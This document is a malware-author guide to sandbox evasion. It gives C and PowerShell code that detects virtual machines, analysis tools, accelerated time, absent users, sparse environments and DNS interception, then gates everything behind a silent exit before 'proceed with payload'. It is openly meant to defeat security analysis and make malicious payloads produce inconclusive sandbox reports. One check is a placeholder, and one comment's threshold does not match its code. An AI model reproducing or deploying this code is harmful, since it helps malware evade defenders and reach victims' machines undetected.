# Sandbox detection

Check whether the execution environment is an automated analysis sandbox before
committing to any detectable action. Run these checks early, before any network
connection, persistence mechanism, or payload execution.

## VM and hypervisor checks

```c
#include <windows.h>
#include <intrin.h>
#include <stdbool.h>

bool in_hypervisor(void) {
    int info[4];
    __cpuid(info, 1);
    // bit 31 of ECX is set when running in a hypervisor
    return (info[2] >> 31) & 1;
}

bool check_registry_vm(void) {
    const char *keys[] = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        NULL
    };
    for (int i = 0; keys[i]; i++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

bool check_mac_prefix(void) {
    // VMware: 00:0C:29, 00:50:56; VirtualBox: 08:00:27
    // enumerate adapters via GetAdaptersInfo and check first 3 bytes of MAC
    // (implementation: iphlpapi.h)
    return false; // placeholder
}
```

PowerShell equivalent:

```powershell
function Test-Sandbox {
    $indicators = @()

    # hypervisor CPUID check via WMI
    $cpu = Get-WmiObject -Class Win32_Processor
    if ($cpu.VirtualizationFirmwareEnabled -or (Get-WmiObject Win32_ComputerSystem).HypervisorPresent) {
        $indicators += 'hypervisor'
    }

    # VM process indicators
    $vmProcs = @('vmtoolsd','vmwaretray','vmwareuser','vboxservice','vboxtray',
                 'sandboxie','sbiectrl','vmsrvc','vmusrvc')
    $running = Get-Process | Select-Object -ExpandProperty Name
    foreach ($p in $vmProcs) {
        if ($running -contains $p) { $indicators += "process:$p" }
    }

    # analysis tool indicators
    $analysisProcs = @('wireshark','procmon','procexp','ollydbg','x64dbg','ida64',
                       'fiddler','charles','burpsuite')
    foreach ($p in $analysisProcs) {
        if ($running -contains $p) { $indicators += "analysis:$p" }
    }

    return $indicators
}

$found = Test-Sandbox
if ($found.Count -gt 0) { exit 0 }  # silent exit, look like normal termination
```

## Time-based checks

```powershell
function Test-TimeAcceleration {
    $before = [System.DateTime]::UtcNow
    Start-Sleep -Seconds 30
    $after = [System.DateTime]::UtcNow
    $elapsed = ($after - $before).TotalSeconds
    # if less than 25 seconds passed during a 30-second sleep, time was accelerated
    return $elapsed -lt 25
}

if (Test-TimeAcceleration) { exit 0 }
```

CPU cycle counting for higher precision (avoids sleep acceleration):

```c
// use RDTSC before and after a computation loop
// if cycles per wall-clock-second is implausibly high, environment is suspicious
unsigned long long rdtsc_before = __rdtsc();
Sleep(1000);
unsigned long long rdtsc_after = __rdtsc();
unsigned long long cycles = rdtsc_after - rdtsc_before;
// on modern hardware: ~2-4 billion cycles per second
// if cycles < 100000 for a 1-second sleep: time was accelerated
if (cycles < 1000000000ULL) { exit(0); }
```

## User interaction checks

```powershell
function Test-UserPresence {
    Add-Type @'
    using System.Runtime.InteropServices;
    public class Input {
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out System.Drawing.Point lpPoint);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
    }
'@

    $p1 = New-Object System.Drawing.Point
    [Input]::GetCursorPos([ref]$p1)
    Start-Sleep -Seconds 5
    $p2 = New-Object System.Drawing.Point
    [Input]::GetCursorPos([ref]$p2)

    # no mouse movement
    if ($p1.X -eq $p2.X -and $p1.Y -eq $p2.Y) { return $false }

    # cursor at origin or very close (sandbox default)
    if ($p2.X -lt 10 -and $p2.Y -lt 10) { return $false }

    # no foreground window
    $hwnd = [Input]::GetForegroundWindow()
    if ($hwnd -eq [IntPtr]::Zero) { return $false }

    return $true
}

if (-not (Test-UserPresence)) { exit 0 }
```

## Environment plausibility

```powershell
function Test-RealEnvironment {
    # recent files (a real user has some)
    $recentPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Recent')
    $recentCount = (Get-ChildItem $recentPath -ErrorAction SilentlyContinue).Count
    if ($recentCount -lt 5) { return $false }

    # running process count (a real workstation has more than a sandbox)
    if ((Get-Process).Count -lt 25) { return $false }

    # screen resolution (sandboxes often use minimal resolution)
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    if ($screen.Bounds.Width -lt 800 -or $screen.Bounds.Height -lt 600) { return $false }

    # uptime (sandboxes are freshly booted)
    $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 10) { return $false }

    return $true
}

if (-not (Test-RealEnvironment)) { exit 0 }
```

## DNS-based network check

```powershell
function Test-NetworkReal {
    # a real network returns NXDOMAIN for non-existent domains
    # a sandboxed network often resolves everything
    try {
        [System.Net.Dns]::GetHostAddresses('this.definitely.does.not.exist.invalid')
        # resolved: sandbox intercepting DNS
        return $false
    } catch {
        # NXDOMAIN: real network behaviour
        return $true
    }
}

if (-not (Test-NetworkReal)) { exit 0 }
```

## Putting it together

Run all checks before any action. Exit cleanly on failure (no crash, no error message).
A clean exit from a sandbox analysis produces an inconclusive report.

```powershell
# gate: run all checks, exit silently if any fails
$checks = @(
    { (Test-Sandbox).Count -eq 0 },
    { -not (Test-TimeAcceleration) },
    { Test-UserPresence },
    { Test-RealEnvironment },
    { Test-NetworkReal }
)

foreach ($check in $checks) {
    if (-not (& $check)) { [System.Environment]::Exit(0) }
}

# environment is real: proceed with payload
```
